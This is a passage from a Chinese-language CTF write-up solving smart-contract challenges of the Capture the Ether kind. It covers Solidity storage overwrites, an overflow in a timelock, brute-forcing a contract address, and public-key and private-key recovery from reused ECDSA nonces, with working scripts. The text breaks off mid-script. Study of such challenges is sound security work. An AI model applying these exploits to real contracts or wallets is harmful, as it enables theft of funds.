donation.etherAmount = etherAmount;<br><br>        donations.push(donation);<br>    &#125;<br><br>    function withdraw() public &#123;<br>        require(msg.sender == owner);<br>        <br>        msg.sender.transfer(address(this).balance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="http://www.freebuf.com/articles/blockchain-articles/175237.html">Solidity中存储方式错误使用所导致的变量覆盖</a></p><p>使传入的etherAmount，其值等于我们的Account地址</p><p>并满足msg.value == etherAmount / scal</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">uint</span><span class="hljs-params">(<span class="hljs-number">0</span>x9DC97146b924263A2c8C7237FbeEAFb6ef60b624)</span></span> / (<span class="hljs-number">10</span>**<span class="hljs-number">18</span>*<span class="hljs-number">10</span>**<span class="hljs-number">18</span>)<br><span class="hljs-comment">//900803868558</span><br></code></pre></td></tr></table></figure><p>然后调用withdraw</p><h3 id="Fifty-years"><a href="#Fifty-years" class="headerlink" title="Fifty years"></a>Fifty years</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract FiftyYearsChallenge &#123;<br>    struct Contribution &#123;<br>        uint256 amount;<br>        uint256 unlockTimestamp;<br>    &#125;<br>    Contribution[] queue;<br>    uint256 head;<br><br>    address owner;<br>    function FiftyYearsChallenge(address player) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        owner = player;<br>        queue.push(Contribution(msg.value, now + 50 years));<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function upsert(uint256 index, uint256 timestamp) public payable &#123;<br>        require(msg.sender == owner);<br><br>        if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123;<br>            // Update existing contribution amount without updating timestamp.<br>            Contribution storage contribution = queue[index];<br>            contribution.amount += msg.value;<br>        &#125; else &#123;<br>            // Append a new contribution. Require that each contribution unlock<br>            // at least 1 day after the previous one.<br>            require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);<br><br>            contribution.amount = msg.value;<br>            contribution.unlockTimestamp = timestamp;<br>            queue.push(contribution);<br>        &#125;<br>    &#125;<br><br>    function withdraw(uint256 index) public &#123;<br>        require(msg.sender == owner);<br>        require(now &gt;= queue[index].unlockTimestamp);<br><br>        // Withdraw this and any earlier contributions.<br>        uint256 total = 0;<br>        for (uint256 i = head; i &lt;= index; i++) &#123;<br>            total += queue[i].amount;<br><br>            // Reclaim storage.<br>            delete queue[i];<br>        &#125;<br><br>        // Move the head of the queue forward so we don&#x27;t have to loop over<br>        // already-withdrawn contributions.<br>        head = index + 1;<br><br>        msg.sender.transfer(total);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>msg.value会覆盖queue的长度，timestamp会覆盖head</p><p>queue.push操作，因为其在最后执行增添对象的任务，添加以后它会将queue.length进行+1操作，用queue长度再覆盖contribution.amount一次</p><ol><li><p>首先，我们创建一个新的队列条目，调用<code>upsert</code>准备绕过<code>timestamp</code>检查。我们选择<code>timestamp</code>这样的值，它会<code>queue[queue.length - 1].unlockTimestamp + 1 days</code>以等于零的方式溢出。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>**<span class="hljs-number">256</span>-<span class="hljs-number">86400</span><br><span class="hljs-attribute">115792089237316195423570985008687907853269984665640564039457584007913129553536</span><br></code></pre></td></tr></table></figure><p>调用Upset(1,115792089237316195423570985008687907853269984665640564039457584007913129553536)并发送1 wei</p></li><li><p>调用Upset(1,0)并发送1 wei</p></li><li><p>调用withdraw(1)</p></li></ol><h2 id="Accounts"><a href="#Accounts" class="headerlink" title="Accounts"></a>Accounts</h2><h3 id="Fuzzy-identity"><a href="#Fuzzy-identity" class="headerlink" title="Fuzzy identity"></a>Fuzzy identity</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>interface IName &#123;<br>    function name() external view returns (bytes32);<br>&#125;<br><br>contract FuzzyIdentityChallenge &#123;<br>    bool public isComplete;<br><br>    function authenticate() public &#123;<br>        require(isSmarx(msg.sender));<br>        require(isBadCode(msg.sender));<br><br>        isComplete = true;<br>    &#125;<br><br>    function isSmarx(address addr) internal view returns (bool) &#123;<br>        return IName(addr).name() == bytes32(&quot;smarx&quot;);<br>    &#125;<br><br>    function isBadCode(address _addr) internal pure returns (bool) &#123;<br>        bytes20 addr = bytes20(_addr);<br>        bytes20 id = hex&quot;000000000000000000000000000000000badc0de&quot;;<br>        bytes20 mask = hex&quot;000000000000000000000000000000000fffffff&quot;;<br><br>        for (uint256 i = 0; i &lt; 34; i++) &#123;<br>            if (addr &amp; mask == id) &#123;<br>                return true;<br>            &#125;<br>            mask &lt;&lt;= 4;<br>            id &lt;&lt;= 4;<br>        &#125;<br><br>        return false;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>要求：</p><ol><li>合约的name为smarx</li><li>合约地址里包含 <code>badc0de</code></li></ol><p>以太坊源码中生成合约地址的算法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CreateAddress</span><span class="hljs-params">(b common.Address, nonce <span class="hljs-keyword">uint64</span>)</span> <span class="hljs-title">common</span>.<span class="hljs-title">Address</span></span> &#123;<br><br>    data, _ := rlp.EncodeToBytes([]<span class="hljs-keyword">interface</span>&#123;&#125;&#123;b, nonce&#125;) <span class="hljs-comment">//对地址和nonce进行rlp编码</span><br><br>    <span class="hljs-keyword">return</span> common.BytesToAddress(Keccak256(data)[<span class="hljs-number">12</span>:]) <span class="hljs-comment">//利用keccak256算hash，后20个字节作为新地址</span><br><br>&#125;<br></code></pre></td></tr></table></figure><p>使用<a href="https://github.com/ethjs/ethjs-account">ethjs-account</a>来生成地址</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> rlp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;rlp&#x27;</span>);<br><span class="hljs-keyword">const</span> js = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;_js-sha3@0.8.0@js-sha3&#x27;</span>);<br><span class="hljs-keyword">const</span> generate = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ethjs-account&#x27;</span>).generate;<br><br>seed=<span class="hljs-string">&#x27;892h@fs8sk^2hSFR*/8s8shfs.jk39hsoi@hohskd51D1Q8E1%^;DZ1-=.@WWRXNI()VF6/*Z%$C51D1QV*&lt;&gt;FE8RG!FI;&quot;./+-*!DQ39hsoi@hoFE1F5^7E%&amp;*QS&#x27;</span><span class="hljs-comment">//生成地址所用的种子</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fuzz</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> k=<span class="hljs-number">0</span>;k&lt;<span class="hljs-number">50000</span>;k++)&#123;<br>        seed=seed+<span class="hljs-built_in">Math</span>.random().toString(<span class="hljs-number">36</span>).substring(<span class="hljs-number">12</span>);<span class="hljs-comment">//为避免重复，生成一定数目后对种子进行更新</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">1000</span>;i++)&#123;<br>            res=generate(seed);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">10</span>;j++)&#123;<br>                encodedRlp = rlp.encode([res.address, j]);<span class="hljs-comment">// 进行rlp编码</span><br>                buf = js.keccak256(encodedRlp);<br>                contractAddress =buf.slice(<span class="hljs-number">24</span>).toString(<span class="hljs-string">&#x27;hex&#x27;</span>);<span class="hljs-comment">//取buffer第12个字节后面的部分作为地址</span><br><br>                <span class="hljs-keyword">if</span>(contractAddress.slice(<span class="hljs-number">33</span>).match(<span class="hljs-string">&quot;badc0de&quot;</span>))&#123;<br>                    <span class="hljs-built_in">console</span>.log(contractAddress);<br>                    <span class="hljs-built_in">console</span>.log(res);<br>                    <span class="hljs-built_in">console</span>.log(j);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-comment">//console.log(i);</span><br>        &#125;<br>    &#125;<br>&#125;<br>fuzz();<br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">76</span>e9f28df246ee1b3f7d3bb2c4c81e6f0badc0de<br>&#123;<br>  privateKey: &#x27;0x2f1c57a072bd38affcdeaf2c574b9e9c8c120b<span class="hljs-number">7391</span>eb54a48a<span class="hljs-number">110345</span>cbd1ae88&#x27;,<br>  publicKey: &#x27;0xb111b1d6f154e4a<span class="hljs-number">8785</span>9bb2ad60bf05fd26abb7e77c6f26c<span class="hljs-number">492480</span>3ee<span class="hljs-number">9673</span>a3e<span class="hljs-number">55147652</span>d2f<span class="hljs-number">2662</span>d5a<span class="hljs-number">6591</span>df503f<span class="hljs-number">2711</span>7c182ce1b20d8afaaf2b4d4ed6a<span class="hljs-number">0737</span>9&#x27;,<br>  address: &#x27;0x4ABE0ad41C9A<span class="hljs-number">8128</span>9dCa9F257fd<span class="hljs-number">448264</span>e18AB1B&#x27;<br>&#125;<br><span class="hljs-number">8</span><br><br></code></pre></td></tr></table></figure><p>nonce为8时部署攻击合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract attack &#123;<br>    FuzzyIdentityChallenge fuzz;<br>    function pwn()&#123;<br>        fuzz=FuzzyIdentityChallenge(address of your challenge);<br>        fuzz.authenticate();<br>    &#125;<br>    function name() external view returns(bytes32)&#123;<br>        return bytes32(&quot;smarx&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Public-Key"><a href="#Public-Key" class="headerlink" title="Public Key"></a>Public Key</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract PublicKeyChallenge &#123;<br>    address owner = 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;<br>    bool public isComplete;<br><br>    function authenticate(bytes publicKey) public &#123;<br>        require(address(keccak256(publicKey)) == owner);<br><br>        isComplete = true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>由地址得到公钥</p><p><a href="https://blog.csdn.net/teaspring/article/details/77834360">椭圆曲线密码学和以太坊中的椭圆曲线数字签名算法应用</a></p><p>由 <code>w3.eth.getTransaction(&quot;0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb&quot;)</code> 可以得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AttributeDict</span>(&#123;&#x27;blockHash&#x27;: HexBytes(&#x27;<span class="hljs-number">0</span>x<span class="hljs-number">487183</span>cd<span class="hljs-number">9</span>eed<span class="hljs-number">0970</span>dab<span class="hljs-number">843</span>c<span class="hljs-number">9</span>ebd<span class="hljs-number">577</span>e<span class="hljs-number">6</span>af<span class="hljs-number">3</span>e<span class="hljs-number">1</span>eb<span class="hljs-number">7</span>c<span class="hljs-number">9809</span>d<span class="hljs-number">240</span>c<span class="hljs-number">8735</span>eab<span class="hljs-number">7</span>cb<span class="hljs-number">43</span>de&#x27;), &#x27;blockNumber&#x27;: <span class="hljs-number">3015083</span>, &#x27;from&#x27;: &#x27;<span class="hljs-number">0</span>x<span class="hljs-number">92</span>b<span class="hljs-number">28647</span>Ae<span class="hljs-number">1</span>F<span class="hljs-number">3264661</span>f<span class="hljs-number">72</span>fb<span class="hljs-number">2</span>eB<span class="hljs-number">9625</span>A<span class="hljs-number">89</span>D<span class="hljs-number">88</span>A<span class="hljs-number">31</span>&#x27;, &#x27;gas&#x27;: <span class="hljs-number">90000</span>, &#x27;gasPrice&#x27;: <span class="hljs-number">1000000000</span>, &#x27;hash&#x27;: HexBytes(&#x27;<span class="hljs-number">0</span>xabc<span class="hljs-number">467</span>bedd<span class="hljs-number">1</span>d<span class="hljs-number">17462</span>fcc<span class="hljs-number">7942</span>d<span class="hljs-number">0</span>af<span class="hljs-number">7874</span>d<span class="hljs-number">6</span>f<span class="hljs-number">8</span>bdefee<span class="hljs-number">2</span>b<span class="hljs-number">299</span>c<span class="hljs-number">9168</span>a<span class="hljs-number">216</span>d<span class="hljs-number">3</span>ff<span class="hljs-number">0</span>edb&#x27;), &#x27;input&#x27;: &#x27;<span class="hljs-number">0</span>x<span class="hljs-number">5468616</span>e<span class="hljs-number">6</span>b<span class="hljs-number">732</span>c<span class="hljs-number">206</span>d<span class="hljs-number">616</span>e<span class="hljs-number">21</span>&#x27;, &#x27;nonce&#x27;: <span class="hljs-number">0</span>, &#x27;r&#x27;: HexBytes(&#x27;<span class="hljs-number">0</span>xa<span class="hljs-number">5522718</span>c<span class="hljs-number">0</span>f<span class="hljs-number">95</span>dde<span class="hljs-number">27</span>f<span class="hljs-number">0827</span>f<span class="hljs-number">55</span>de<span class="hljs-number">836342</span>ceda<span class="hljs-number">594</span>d<span class="hljs-number">20458523</span>dd<span class="hljs-number">71</span>a<span class="hljs-number">539</span>d<span class="hljs-number">52</span>ad<span class="hljs-number">7</span>&#x27;), &#x27;s&#x27;: HexBytes(&#x27;<span class="hljs-number">0</span>x<span class="hljs-number">5710</span>e<span class="hljs-number">64311</span>d<span class="hljs-number">481764</span>b<span class="hljs-number">5</span>ae<span class="hljs-number">8</span>ca<span class="hljs-number">691</span>b<span class="hljs-number">05</span>d<span class="hljs-number">14054782</span>c<span class="hljs-number">7</span>d<span class="hljs-number">489</span>f<span class="hljs-number">3511</span>a<span class="hljs-number">7</span>abf<span class="hljs-number">2</span>f<span class="hljs-number">5078962</span>&#x27;), &#x27;to&#x27;: &#x27;<span class="hljs-number">0</span>x<span class="hljs-number">6</span>B<span class="hljs-number">477781</span>b<span class="hljs-number">0</span>e<span class="hljs-number">68031109</span>f<span class="hljs-number">21887</span>e<span class="hljs-number">6</span>B<span class="hljs-number">5</span>afEAaEB<span class="hljs-number">002</span>b&#x27;, &#x27;transactionIndex&#x27;: <span class="hljs-number">7</span>, &#x27;type&#x27;: &#x27;<span class="hljs-number">0</span>x<span class="hljs-number">0</span>&#x27;, &#x27;v&#x27;: <span class="hljs-number">41</span>, &#x27;value&#x27;: <span class="hljs-number">0</span>&#125;)<br></code></pre></td></tr></table></figure><p>使用<a href="https://github.com/ethereumjs/ethereumjs-tx">ethereumjs-tx</a>库创建一个交易从而利用里面封装的getSenderAddress得到公钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">const EthereumTx = require(&#x27;ethereumjs-tx&#x27;).Transaction;<br>const js = require(&#x27;_js-sha3@0.8.0@js-sha3&#x27;);<br><br>var rawTx = &#123;<br>    nonce: &#x27;0x00&#x27;,<br>    gasPrice: &#x27;0x3b9aca00&#x27;,<br>    gasLimit: &#x27;0x15f90&#x27;,<br>    to: &#x27;0x6B477781b0e68031109f21887e6B5afEAaEB002b&#x27;,<br>    value: &#x27;0x00&#x27;,<br>    data: &#x27;0x5468616e6b732c206d616e21&#x27;,<br>    v: &#x27;0x29&#x27;,<br>    r: &#x27;0xa5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7&#x27;,<br>    s: &#x27;0x5710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962&#x27;<br>&#125;;<br><br>var tx = new EthereumTx(rawTx, &#123; chain: &#x27;ropsten&#x27;, hardfork: &#x27;petersburg&#x27; &#125;);<br><br>pubkey=tx.getSenderPublicKey();<br>pubkeys=pubkey.toString(&#x27;hex&#x27;);<br>var address = js.keccak256(pubkey).toString(&#x27;hex&#x27;).slice(24);<br><br>console.log(pubkeys);<br>console.log(address);<br><br></code></pre></td></tr></table></figure><h3 id="Account-Takeover"><a href="#Account-Takeover" class="headerlink" title="Account Takeover"></a>Account Takeover</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract AccountTakeoverChallenge &#123;<br>    address owner = 0x6B477781b0e68031109f21887e6B5afEAaEB002b;<br>    bool public isComplete;<br><br>    function authenticate() public &#123;<br>        require(msg.sender == owner);<br><br>        isComplete = true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>给出了地址求私钥</p><p><a href="https://xz.aliyun.com/t/2718">参考1</a></p><p><a href="http://snowming.me/2022/01/05/recover_secert_key/">参考2</a></p><p>有两笔同 from 地址且同 to 地址的交易，且 r 值相同</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> EthereumTx = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ethereumjs-tx&#x27;</span>).Transaction;<br><span class="hljs-keyword">var</span> rawTx1 =<br>    &#123; <span class="hljs-attr">nonce</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-attr">gasPrice</span>: <span class="hljs-string">&#x27;0x3b9aca00&#x27;</span>,<br>        <span class="hljs-attr">gasLimit</span>: <span class="hljs-string">&#x27;0x5208&#x27;</span>,<br>        <span class="hljs-attr">to</span>: <span class="hljs-string">&#x27;0x92b28647ae1f3264661f72fb2eb9625a89d88a31&#x27;</span>,<br>        <span class="hljs-attr">value</span>: <span class="hljs-string">&#x27;0x1111d67bb1bb0000&#x27;</span>,<br>        <span class="hljs-attr">data</span>: <span class="hljs-string">&#x27;0x&#x27;</span>,<br>        <span class="hljs-attr">v</span>: <span class="hljs-number">41</span>,<br>        <span class="hljs-attr">r</span>: <span class="hljs-string">&#x27;0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166&#x27;</span>,<br>        <span class="hljs-attr">s</span>: <span class="hljs-string">&#x27;0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8&#x27;</span><br>    &#125;<br><span class="hljs-keyword">var</span> rawTx2 =<br>    &#123; <span class="hljs-attr">nonce</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-attr">gasPrice</span>: <span class="hljs-string">&#x27;0x3b9aca00&#x27;</span>,<br>        <span class="hljs-attr">gasLimit</span>: <span class="hljs-string">&#x27;0x5208&#x27;</span>,<br>        <span class="hljs-attr">to</span>: <span class="hljs-string">&#x27;0x92b28647ae1f3264661f72fb2eb9625a89d88a31&#x27;</span>,<br>        <span class="hljs-attr">value</span>: <span class="hljs-string">&#x27;0x1922e95bca330e00&#x27;</span>,<br>        <span class="hljs-attr">data</span>: <span class="hljs-string">&#x27;0x&#x27;</span>,<br>        <span class="hljs-attr">v</span>: <span class="hljs-number">41</span>,<br>        <span class="hljs-attr">r</span>: <span class="hljs-string">&#x27;0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166&#x27;</span>,<br>        <span class="hljs-attr">s</span>: <span class="hljs-string">&#x27;0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de&#x27;</span><br>    &#125;<br>tx1 = <span class="hljs-keyword">new</span> EthereumTx(rawTx1,&#123; <span class="hljs-attr">chain</span>: <span class="hljs-string">&#x27;ropsten&#x27;</span>, <span class="hljs-attr">hardfork</span>: <span class="hljs-string">&#x27;petersburg&#x27;</span> &#125;);<br>tx2 = <span class="hljs-keyword">new</span> EthereumTx(rawTx2,&#123; <span class="hljs-attr">chain</span>: <span class="hljs-string">&#x27;ropsten&#x27;</span>, <span class="hljs-attr">hardfork</span>: <span class="hljs-string">&#x27;petersburg&#x27;</span> &#125;);<br><br>z1=tx1.hash(<span class="hljs-literal">false</span>).toString(<span class="hljs-string">&quot;hex&quot;</span>);<br>z2=tx2.hash(<span class="hljs-literal">false</span>).toString(<span class="hljs-string">&quot;hex&quot;</span>);<br><span class="hljs-built_in">console</span>.log(z1);<br><span class="hljs-built_in">console</span>.log(z2);<br></code></pre></td></tr></table></figure><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-symbol">s1</span>-<span class="hljs-symbol">s2</span> = k ^ -<span class="hljs-number">1</span>（<span class="hljs-symbol">z1</span> + dA * r）-k ^ -<span class="hljs-number">1</span>（<span class="hljs-symbol">z2</span>+ dA * r）<br>= k^-<span class="hljs-number">1</span>(<span class="hljs-symbol">z1</span>-<span class="hljs-symbol">z2</span>)<br>k = (<span class="hljs-symbol">z1</span>-<span class="hljs-symbol">z2</span>)/(<span class="hljs-symbol">s1</span>-<span class="hljs-symbol">s2</span>)<br><br>所以私钥 d = (s*k-z)/r<br>= (s*k-z) * inverse_mod(r, p) % p<br><br>k = (<span class="hljs-symbol">z1</span>-<span class="hljs-symbol">z2</span>)/(<span class="hljs-symbol">s1</span>-<span class="hljs-symbol">s2</span>)<br>= (<span class="hljs-symbol">z1</span> – <span class="hljs-symbol">z2</span>)*inverse_mod(<span class="hljs-symbol">s1</span> – <span class="hljs-symbol">s2</span>,p)%p<br></code></pre></td></tr></table></figure><p>其中取模反的运算来自于<a href="https://github.com/warner/python-ecdsa/">python-ecdsa</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inverse_mod</span>(<span class="hljs-params"> a, m </span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;Inverse of a mod m.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> a &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> m &lt;= a: a = a % m<br>    c, d = a, m<br>    uc, vc, ud, vd = <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> c != <span class="hljs-number">0</span>:<br>        q, c, d = <span class="hljs-built_in">divmod</span>( d, c ) + ( c, )<br>        uc, vc, ud, vd = ud - q*uc, vd - q*vc, uc, vc<br><br>    <span class="hljs-keyword">assert</span> d == <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> ud &gt; <span class="hljs-number">0</span>: <span class="hljs-keyword">return</span> ud<br>    <span class="hljs-keyword">else</span>: <span class="hljs-keyword">return</span> ud + m<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">derivate_privkey</span>(<span class="hljs-params">p, r, s1, s2, z1, z2</span>):</span><br>    z = z1 - z2<br>    s = s1 - s2<br>    r_inv = inverse_mod(r, p)<br>    s_inv = inverse_mod(s, p)<br>    k = (z * s_inv) % p<br>    d = (r_inv * (s1 * k - z1)) % p<br>    <span class="hljs-keyword">return</span> d, k<br><br>z1 = <span class="hljs-number">0x4f6a8370a435a27724bbc163419042d71b6dcbeb61c060cc6816cda93f57860c</span><br>s1 = <span class="hljs-number">0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de</span><br>r = <span class="hljs-number">0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166</span><br>z2 = <span class="hljs-number">0x350f3ee8007d817fbd7349c477507f923c4682b3e69bd1df5fbb93b39beb1e04</span><br>s2 = <span 